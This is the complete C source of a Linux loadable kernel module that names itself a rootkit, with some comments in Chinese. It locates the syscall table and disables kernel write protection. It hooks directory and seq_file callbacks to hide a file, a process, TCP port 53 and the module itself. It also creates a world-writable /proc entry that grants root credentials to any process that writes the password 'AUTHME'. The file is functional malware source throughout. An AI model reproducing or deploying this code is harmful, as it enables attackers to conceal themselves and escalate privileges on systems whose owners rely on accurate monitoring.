#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h> //__NR_close sys_close
#include <linux/string.h>
#include <linux/slab.h> //kfree kmalloc
# include <linux/fs.h> //filp_open, filp_close, struct file, struct dir_context
# include <linux/dirent.h> //struct linux_dirent64
# include <net/tcp.h> // struct tcp_seq_afinfo.

MODULE_LICENSE("GPL");

#if defined(__i386__)
#define START_CHECK 0xc0000000
#define END_CHECK 0xd0000000
typedef unsigned int psize;
#else
#define START_CHECK 0xffffffff81000000
#define END_CHECK 0xffffffffa2000000
typedef unsigned long psize;
#endif

# define ROOT_PATH "/"
# define SECRET_FILE "test.c"
# define ROOT_PATH_PS "/proc"
# define SECRET_PROC 1

# define NET_ENTRY "/proc/net/tcp"
# define SEQ_AFINFO_STRUCT struct tcp_seq_afinfo
# define SECRET_PORT 53
# define NEEDLE_LEN 6
# define TMPSZ 150

# define ROOT_PATH_MD "/sys/module"
# define PROC_PATH_MD "/proc/modules"
# define SECRET_MODULE "rootkit"

unsigned long *sys_call_table;

int (*real_iterate)(struct file *filp, struct dir_context *ctx);
int (*real_filldir)(struct dir_context *ctx,
                const char *name, int namlen,
                loff_t offset, u64 ino, unsigned d_type);
                
int (*real_iterate_ps)(struct file *filp, struct dir_context *ctx);
int (*real_filldir_ps)(struct dir_context *ctx,
                const char *name, int namlen,
                loff_t offset, u64 ino, unsigned d_type);
int (*real_seq_show)(struct seq_file *seq, void *v);

int (*real_iterate_md)(struct file *filp, struct dir_context *ctx);
int (*real_filldir_md)(struct dir_context *ctx,
                const char *name, int namlen,
                loff_t offset, u64 ino, unsigned d_type);
int (*real_seq_show_md)(struct seq_file *seq, void *v);




unsigned long *find(void);
void disable_wp(void);
void enable_wp(void);
int fake_iterate(struct file *filp, struct dir_context *ctx);
int fake_filldir(struct dir_context *ctx, const char *name, int namlen,
             loff_t offset, u64 ino, unsigned d_type);
             
int fake_iterate_ps(struct file *filp, struct dir_context *ctx);       
int fake_filldir_ps(struct dir_context *ctx, const char *name, int namlen,
             loff_t offset, u64 ino, unsigned d_type);
int fake_seq_show(struct seq_file *seq, void *v);

int fake_iterate_md(struct file *filp, struct dir_context *ctx);
int fake_filldir_md(struct dir_context *ctx, const char *name, int namlen,
             loff_t offset, u64 ino, unsigned d_type);
int fake_seq_show_md(struct seq_file *seq, void *v);


#define NAME "PROMOTION"
#define AUTH "AUTHME"
struct proc_dir_entry *entry;
ssize_t write_handler(struct file * filp, const char __user *buff,
              size_t count, loff_t *offp);
struct file_operations proc_fops = {
    .write = write_handler
};


//set_file_op(iterate, ROOT_PATH, fake_iterate, real_iterate)
# define set_file_op(op, path, new, old)                            \
    do {                                                            \
        struct file *filp;                                          \
        struct file_operations *f_op;                               \
                                                                    \
        printk("Opening the path: %s.\n", path);                  \
        filp = filp_open(path, O_RDONLY, 0);                        \
        if (IS_ERR(filp)) {                                         \
            printk("Failed to open %s with error %ld.\n",         \
                     path, PTR_ERR(filp));                          \
            old = NULL;                                             \
        } else {                                                    \
            printk("Succeeded in opening: %s\n", path);           \
            f_op = (struct file_operations *)filp->f_op;            \
            old = f_op->op;                                         \
                                                                    \
            printk("Changing file_op->" #op " from %p to %p.\n",  \
                     old, new);                                     \
            disable_wp();                             \
            f_op->op = new;                                         \
            enable_wp();                              \
        }                                                           \
    } while (0)

// set_afinfo_seq_op(show, NET_ENTRY, SEQ_AFINFO_STRUCT, fake_seq_show, real_seq_show)
# define set_afinfo_seq_op(op, path, afinfo_struct, new, old)   \
    do {                                                        \
        struct file *filp;                                      \
        afinfo_struct *afinfo;                                  \
                                                                \
        filp = filp_open(path, O_RDONLY, 0);                    \
        if (IS_ERR(filp)) {                                     \
            printk("Failed to open %s with error %ld.\n",     \
                     path, PTR_ERR(filp));                      \
            old = NULL;                                         \
        } else {                                                \
                                                                \
            afinfo = PDE_DATA(filp->f_path.dentry->d_inode);    \
            old = afinfo->seq_ops.op;                           \
            printk("Setting seq_op->" #op " from %p to %p.",  \
                     old, new);                                 \
            afinfo->seq_ops.op = new;                           \
                                                                \
            filp_close(filp, 0);                                \
        }                                                       \
    } while (0)

//
# define set_file_seq_op(opname, path, new, old)                    \
    do {                                                            \
        struct file *filp;                                          \
        struct seq_file *seq;                                       \
        struct seq_operations *seq_op;                              \
                                                                    \
        printk("Opening the path: %s.\n", path);                  \
        filp = filp_open(path, O_RDONLY, 0);                        \
        if (IS_ERR(filp)) {                                         \
            printk("Failed to open %s with error %ld.\n",         \
                     path, PTR_ERR(filp));                          \
            old = NULL;                                             \
        } else {                                                    \
            printk("Succeeded in opening: %s\n", path);           \
            seq = (struct seq_file *)filp->private_data;            \
            seq_op = (struct seq_operations *)seq->op;              \
            old = seq_op->opname;                                   \
                                                                    \
            printk("Changing seq_op->"#opname" from %p to %p.\n", \
                     old, new);                                     \
            disable_wp();                              \
            seq_op->opname = new;                                   \
            enable_wp();                              \
        }                                                           \
    } while (0)

/*******************start************************/
int init_module(void)
{
	printk("rootkit load!!!\n");
	
	if((sys_call_table = find())){
		printk("rootkit: sys_call_table found at %p\n", sys_call_table);	
	}else{
		printk("rootkit: sys_call_table not found, aborting\n");	
	}	
	
	// shield file
	set_file_op(iterate, ROOT_PATH, fake_iterate, real_iterate);

    if (!real_iterate) {
        return -ENOENT;
    }
    printk("iterate has changed.\n");
	
	// shield process
	set_file_op(iterate, ROOT_PATH_PS, fake_iterate_ps, real_iterate_ps);

    if (!real_iterate_ps) {
        return -ENOENT;
    }
	printk("iterate_ps has changed.\n");
	
	set_afinfo_seq_op(show, NET_ENTRY, SEQ_AFINFO_STRUCT,
                      fake_seq_show, real_seq_show);
    printk("tcp port has been shielded.\n");
    
    //root authentication
    entry = proc_create(NAME, S_IRUGO | S_IWUGO, NULL, &proc_fops);
	printk("proc PROMOTION write success.\n");
	
	//module shield
	
	set_file_op(iterate, ROOT_PATH_MD, fake_iterate_md, real_iterate_md);

    if (!real_iterate_md) {
        return -ENOENT;
    }

    set_file_seq_op(show, PROC_PATH_MD, fake_seq_show_md, real_seq_show_md);
    printk("module is hidden.\n");
	
	
	
	return 0;
}

void cleanup_module(void)
{	
	if (real_iterate) {
        void *dummy;
        set_file_op(iterate, ROOT_PATH, real_iterate, dummy);
    }
    
    if (real_iterate_ps) {
        void *dummy;
        set_file_op(iterate, ROOT_PATH_PS, real_iterate_ps, dummy);
    }
    
    if (real_seq_show) {
        void *dummy;
        set_afinfo_seq_op(show, NET_ENTRY, SEQ_AFINFO_STRUCT,
                          real_seq_show, dummy);
    }
    
    proc_remove(entry);//proc PROMOTION delete
    
    if (real_iterate_md) {
        void *dummy;
        set_file_op(iterate, ROOT_PATH_MD, real_iterate_md, dummy);
    }
    if (real_seq_show_md) {
        void *dummy;
        set_file_seq_op(show, PROC_PATH_MD, real_seq_show_md, dummy);
    }
    
    
    
	printk("rootkit unload!!!\n");
}
/******************end***************************/


unsigned long *find(void)
{
	unsigned long *sctable;
	unsigned long i = START_CHECK;
	while(i < END_CHECK){
		sctable = (unsigned long *) i;
		if((unsigned long *)sctable[__NR_close] == (unsigned long *)sys_close){ //fixed position in table,sct[nr] 
			return sctable;//return &sctable[0];
		}
		i += sizeof(void *);
	}
	return NULL;
}

void disable_wp(void)
{
	unsigned long cr0;
	
	preempt_disable();
    cr0 = read_cr0();
    clear_bit(X86_CR0_WP_BIT, &cr0);
    write_cr0(cr0);
    preempt_enable();
    
    return;
}

void enable_wp(void)
{
	unsigned long cr0;

    preempt_disable();
    cr0 = read_cr0();
    set_bit(X86_CR0_WP_BIT, &cr0);
    write_cr0(cr0);
    preempt_enable();

    return;
}


int fake_iterate(struct file *filp, struct dir_context *ctx)
{
    // 备份真的 ``filldir``，以备后面之需。
    real_filldir = ctx->actor;

    // 把 ``struct dir_context`` 里的 ``actor``，
    // 也就是真的 ``filldir``
    // 替换成我们的假 ``filldir``
    *(filldir_t *)&ctx->actor = fake_filldir;

    return real_iterate(filp, ctx);
}


int fake_filldir(struct dir_context *ctx, const char *name, int namlen,
             loff_t offset, u64 ino, unsigned d_type)
{
    if (strncmp(name, SECRET_FILE, strlen(SECRET_FILE)) == 0) {
        // 如果是需要隐藏的文件，直接返回，不填到缓冲区里。
        printk("Hiding: %s\n", name);
        return 0;
    }

    /* pr_cont("%s ", name); */

    // 如果不是需要隐藏的文件，
    // 交给的真的 ``filldir`` 把这个记录填到缓冲区里。
    return real_filldir(ctx, name, namlen, offset, ino, d_type);
}


/* methods : sheild process */

int fake_iterate_ps(struct file *filp, struct dir_context *ctx)
{
    real_filldir_ps = ctx->actor;
    *(filldir_t *)&ctx->actor = fake_filldir_ps;

    return real_iterate_ps(filp, ctx);
}

int fake_filldir_ps(struct dir_context *ctx, const char *name, int namlen,
             loff_t offset, u64 ino, unsigned d_type)
{
    char *endp;
    long pid;

    pid = simple_strtol(name, &endp, 10);

    if (pid == SECRET_PROC) {
        printk("Hiding pid: %ld\n", pid);
        return 0;
    }

    /* pr_cont("%s ", name); */

    return real_filldir_ps(ctx, name, namlen, offset, ino, d_type);
}

int fake_seq_show(struct seq_file *seq, void *v)
{
    int ret;
    char needle[NEEDLE_LEN];

    // 把端口转换成 16 进制，前面带个分号，避免误判。
    // 用来判断这项记录是否需要过滤掉。
    snprintf(needle, NEEDLE_LEN, ":%04X", SECRET_PORT);
    // real_seq_show 会往 buf 里填充一项记录
    ret = real_seq_show(seq, v);

    // 该项记录的起始 = 缓冲区起始 + 已有量 - 每条记录的大小。
    if (strnstr(seq->buf + seq->count - TMPSZ, needle, TMPSZ)) {
        printk("Hiding port %d using needle %s.\n",
                 SECRET_PORT, needle);
        // 记录里包含我们需要隐藏的的端口信息，
        // 把 count 减掉一个记录大小，
        // 相当于把这个记录去除掉了。
        seq->count -= TMPSZ;
    }

    return ret;
}
//shield module
int fake_iterate_md(struct file *filp, struct dir_context *ctx)
{
    real_filldir_md = ctx->actor;
    *(filldir_t *)&ctx->actor = fake_filldir_md;

    return real_iterate_md(filp, ctx);
}
int fake_filldir_md(struct dir_context *ctx, const char *name, int namlen,
             loff_t offset, u64 ino, unsigned d_type)
{
    if (strcmp(name, SECRET_MODULE) == 0) {
        printk("Hiding Module: %s\n", name);
        return 0;
    }

    return real_filldir_md(ctx, name, namlen, offset, ino, d_type);
}
int fake_seq_show_md(struct seq_file *seq, void *v)
{
    int ret;
    size_t last_count, last_size;

    last_count = seq->count;
    ret =  real_seq_show_md(seq, v);
    last_size = seq->count - last_count;

    if (strnstr(seq->buf + seq->count - last_size, SECRET_MODULE,
                last_size)) {
        printk("Hiding module: %s\n", SECRET_MODULE);
        seq->count -= last_size;
    }

    return ret;
}



/* verify and auth user*/
ssize_t write_handler(struct file * filp, const char __user *buff,
              size_t count, loff_t *offp)
{
    char *kbuff;
    struct cred* cred;

    // WARN: Be careful. There is a chance for off-by-one NULL.
    kbuff = kmalloc(count + 1, GFP_KERNEL);
    if (!kbuff) {
        return -ENOMEM;
    }
    if (copy_from_user(kbuff, buff, count)) {
        kfree(kbuff);
        return -EFAULT;
    }
    kbuff[count] = (char)0;

    if (strlen(kbuff) == strlen(AUTH) &&
        strncmp(AUTH, kbuff, count) == 0) {
        printk("%s\n", "Auth success.");

        /* cred = (struct cred *)current_real_cred(); */
        cred = (struct cred *)__task_cred(current);

        // TODO: We might probably just copy the cred from pid 1.
        cred->uid = cred->euid = cred->fsuid = GLOBAL_ROOT_UID;
        cred->gid = cred->egid = cred->fsgid = GLOBAL_ROOT_GID;
        printk("%s\n", "See you!");
    } else {
        printk("Auth failure: %s.\n", kbuff);
    }

    kfree(kbuff);
    return count;
}

